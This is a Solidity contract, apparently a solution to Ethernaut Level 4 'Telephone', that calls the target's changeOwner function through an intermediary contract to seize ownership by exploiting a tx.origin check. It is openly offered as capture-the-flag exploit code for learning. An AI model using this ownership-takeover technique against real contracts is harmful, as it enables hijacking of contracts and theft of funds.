// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @notice Inteface relating to the Telephone contract found in Ethernaut Level 4
 * @notice Full contract can be found in the ethernaut directory of this repo 
 */
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    ITelephone private _telephoneContract;

    constructor(address telephoneContract) {
        _telephoneContract = ITelephone(telephoneContract);
    }

    function attack(address desiredOwner) public {
        _telephoneContract.changeOwner(desiredOwner);
    }
}
